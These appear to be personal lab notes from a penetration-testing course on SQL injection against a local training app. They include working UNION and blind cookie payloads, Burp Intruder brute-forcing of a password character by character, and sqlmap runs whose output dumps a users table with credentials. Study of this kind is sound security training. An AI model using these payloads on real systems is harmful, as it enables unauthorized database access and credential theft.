#SQL  #BurpeSuite #sqlmap  #substr

Test for SQL injection by adding `'` and `"` after a query and if there is an error, may be vulnerable.

```
jeremy' or 1=1#
```

or

```
jeremy' 0r 1=1-- -
```
# Union

Can retrieve information from other tables and columns that are not initially defined.

May be hard to determine how many columns so use this technique to determine number of columns returned:

```
jeremy' union select null#
```

```
jeremy' union select null,null#
```

```
jeremy' union select null,null,null#
```

Now can query version of database:

```
jeremy' union select null,null,version()#
```

Query tables in database:

```
jeremy' union select null,null,table_name from information_schema.tables#
```

Query columns in database:

```
jeremy' union select null,null,column_name from information_schema.columns#
```

Now we can select jeremy's password:

```
jeremy' union select null,null,password from injection0x01#
```

Data in column may be integers (null would return errors) and may need to be specified as followed:

```
jeremy' union select null(int),1,null,password from injection0x01#
```

https://portswigger.net/web-security/sql-injection/cheat-sheet



# SQL Injection Manual Attack Path:

Manually try to find tables in search boxes:
```
EXAMPLE' union select null,null,null,table_name from information_schema.tables#
```

Then use table name for users to find users:
```
EXAMPLE' union select null,null,null,EXAMPLE_USERS_COLUMN from EXAMPLE_USERS_TABLE#
```

Then grab password:
```
EXAMPLE' union select null,null,null,EXAMPLE_PASSWORD_COLUMN from EXAMPLE_USERS_TABLE#
```

... Or, use #sqlmap as it is OP and can find all tables and creds...


# Blind SQL Injections
**(sqlmap is great)**

Login to Injection0x02 as `jeremy:jeremy`

Note:
- cookie/session
- content length
- etc...

edit in Repeater `jeremy' or 1=1` and URL encoded it with `CTRL+U`

Automate this attack with #sqlmap
1. copy Request from Burp, save to txt file
2. run `sqlmap -r req.txt`

```
└─(12:09:16)──> sqlmap -r req.txt                                                                                  ──(Wed,Aug28)─┘
        ___
       __H__                                                                                                                       
 ___ ___["]_____ ___ ___  {1.8.6.3#dev}                                                                                            
|_ -| . [(]     | .'| . |                                                                                                          
|___|_  [']_|_|_|__,|  _|                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:09:25 /2024-08-28/

[12:09:25] [INFO] parsing HTTP request from 'req.txt'
[12:09:25] [INFO] testing connection to the target URL
[12:09:25] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:09:25] [INFO] testing if the target URL content is stable
[12:09:25] [INFO] target URL content is stable
[12:09:25] [INFO] testing if POST parameter 'username' is dynamic
[12:09:25] [WARNING] POST parameter 'username' does not appear to be dynamic
[12:09:25] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[12:09:25] [INFO] testing for SQL injection on POST parameter 'username'
[12:09:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:09:25] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:09:25] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:09:25] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:09:25] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:09:26] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:09:26] [INFO] testing 'Generic inline queries'
[12:09:26] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:09:26] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:09:26] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:09:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:09:26] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:09:26] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:09:26] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[12:09:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:09:48] [WARNING] POST parameter 'username' does not seem to be injectable
[12:09:48] [INFO] testing if POST parameter 'password' is dynamic
[12:09:48] [WARNING] POST parameter 'password' does not appear to be dynamic
[12:09:48] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[12:09:48] [INFO] testing for SQL injection on POST parameter 'password'
[12:09:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:09:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[12:09:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:09:48] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[12:09:48] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[12:09:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[12:09:48] [INFO] testing 'Generic inline queries'
[12:09:48] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[12:09:48] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[12:09:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[12:09:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:09:48] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[12:09:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[12:09:48] [INFO] testing 'Oracle AND time-based blind'
[12:09:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[12:09:48] [WARNING] POST parameter 'password' does not seem to be injectable
[12:09:48] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 12:09:48 /2024-08-28/
```

Password does not seem injectable.

We can try the session cookie then.

1. Send request with cookie to repeater from http history
2. Try adding to session cookie `' and 1=1#`
3. If content length is the same, SQL injection vulnerability


Construct a query that gets character by character from database (Blind SQL Injection - change in behavior gives us data/confirmation), then dump data from table using SQL Map.

Intruder method:
1. Send request with cookie to repeater from http history
2. Try adding to session cookie `' and substring((select version()), 1, 1) = '8'#`
3. If content length is the same, tells us the version of SQL is version 8
4. Try adding to session cookie `' and substring((select version()), 1, 5) = '8.0.3'#`
5. If content length is the same, tells us the version of SQL is version 8.0.3
6. Try adding to session cookie `' and substring((select password from injection0x02 where username = 'jessamy'), 1, 1) = 'a'#` and send this request to Intruder
7. Use Sniper
8. Add payload marker to `a` so it is `§a§`
9. Go to Payloads tab, add a-z and 0-9 to payload settings
	1. can google wordlists or use python to generate lists
10. Start attack
11. Filter results by length (smallest length is success)

SQLMap method:
1. Copy session cookie original request to a txt file and save
2. `sqlmap -r req2.txt --level=2`

```
└─(12:31:51)──> sqlmap -r req2.txt --level=2                                                                 130 ↵ ──(Wed,Aug28)─┘
        ___
       __H__                                                                                                                       
 ___ ___[']_____ ___ ___  {1.8.6.3#dev}                                                                                            
|_ -| . ["]     | .'| . |                                                                                                          
|___|_  [(]_|_|_|__,|  _|                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:32:03 /2024-08-28/

[12:32:03] [INFO] parsing HTTP request from 'req2.txt'
[12:32:03] [INFO] testing connection to the target URL
[12:32:03] [INFO] testing if the target URL content is stable
[12:32:03] [INFO] target URL content is stable
[12:32:03] [INFO] testing if Cookie parameter 'session' is dynamic
do you want to URL encode cookie values (implementation specific)? [Y/n] n
[12:32:11] [INFO] Cookie parameter 'session' appears to be dynamic
[12:32:11] [WARNING] heuristic (basic) test shows that Cookie parameter 'session' might not be injectable
[12:32:11] [INFO] testing for SQL injection on Cookie parameter 'session'
[12:32:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:32:12] [INFO] Cookie parameter 'session' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="your")
[12:32:12] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (1) values? [Y/n] 

[12:32:31] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[12:32:31] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[12:32:31] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[12:32:31] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[12:32:31] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[12:32:31] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[12:32:31] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[12:32:31] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[12:32:31] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:32:31] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[12:32:31] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[12:32:31] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[12:32:31] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[12:32:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[12:32:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[12:32:31] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[12:32:31] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[12:32:31] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[12:32:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[12:32:31] [INFO] testing 'Generic inline queries'
[12:32:31] [INFO] testing 'MySQL inline queries'
[12:32:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[12:32:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[12:32:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[12:32:31] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[12:32:31] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[12:32:31] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[12:32:31] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:32:41] [INFO] Cookie parameter 'session' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
```

3.  Returns a test payload:

```
Cookie parameter 'session' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 285 HTTP(s) requests:
---
Parameter: session (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND 1592=1592 AND 'xPMd'='xPMd

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 1008 FROM (SELECT(SLEEP(5)))hABQ) AND 'YeTn'='YeTn
---
[12:33:50] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12
[12:33:50] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 12:33:50 /2024-08-28/
```

4. Now we can dump database using, `sqlmap -r req2.txt --level=2 --dump` (returns from every table)
	1. To return from Injection0x02 only, `sqlmap -r req2.txt --level=2 --dump -T injection0x02`
```
└─(12:37:10)──> sqlmap -r req2.txt --level=2 --dump -T injection0x02                                           1 ↵ ──(Wed,Aug28)─┘
        ___
       __H__                                                                                                                       
 ___ ___[,]_____ ___ ___  {1.8.6.3#dev}                                                                                            
|_ -| . [,]     | .'| . |                                                                                                          
|___|_  [']_|_|_|__,|  _|                                                                                                          
      |_|V...       |_|   https://sqlmap.org                                                                                       

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:37:27 /2024-08-28/

[12:37:27] [INFO] parsing HTTP request from 'req2.txt'
[12:37:27] [INFO] resuming back-end DBMS 'mysql' 
[12:37:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND 1592=1592 AND 'xPMd'='xPMd

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 1008 FROM (SELECT(SLEEP(5)))hABQ) AND 'YeTn'='YeTn
---
[12:37:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.54, PHP 7.4.33
back-end DBMS: MySQL >= 5.0.12
[12:37:27] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[12:37:27] [INFO] fetching current database
[12:37:27] [INFO] resumed: peh-labs
[12:37:27] [INFO] fetching columns for table 'injection0x02' in database 'peh-labs'
[12:37:27] [INFO] resumed: 4
[12:37:27] [INFO] resumed: username
[12:37:27] [INFO] resumed: password
[12:37:27] [INFO] resumed: email
[12:37:27] [INFO] resumed: session
[12:37:27] [INFO] fetching entries for table 'injection0x02' in database 'peh-labs'
[12:37:27] [INFO] fetching number of entries for table 'injection0x02' in database 'peh-labs'
[12:37:27] [INFO] resumed: 2
[12:37:27] [INFO] resumed: 6967cabefd763ac1a1a88e11159957db
[12:37:27] [INFO] resumed: jeremy@example.com
[12:37:27] [INFO] resumed: jeremy
[12:37:27] [INFO] resumed: jeremy
[12:37:27] [INFO] resumed: 9dedc6891e2839a791ed37157f1241fe
[12:37:27] [INFO] resumed: jessamy@example.com
[12:37:27] [INFO] resumed: ZWFzdGVyZWdn
[12:37:27] [INFO] resumed: jessamy
[12:37:27] [INFO] recognized possible password hashes in column '`session`'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: peh-labs
Table: injection0x02
[2 entries]
+---------------------+--------------+----------+----------------------------------+
| email               | password     | username | session                          |
+---------------------+--------------+----------+----------------------------------+
| jeremy@example.com  | jeremy       | jeremy   | 6967cabefd763ac1a1a88e11159957db |
| jessamy@example.com | ZWFzdGVyZWdn | jessamy  | 9dedc6891e2839a791ed37157f1241fe |
+---------------------+--------------+----------+----------------------------------+

[12:37:36] [INFO] table '`peh-labs`.injection0x02' dumped to CSV file '/home/kali/.local/share/sqlmap/output/localhost/dump/peh-labs/injection0x02.csv'                                                                                                               
[12:37:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/localhost'

[*] ending @ 12:37:36 /2024-08-28/
```

We now have jeremy and jessamy's passwords!

Try upper and lowercase characters in Intruder also.

For real client, sqlmap should be used cautious as many requests could overload system.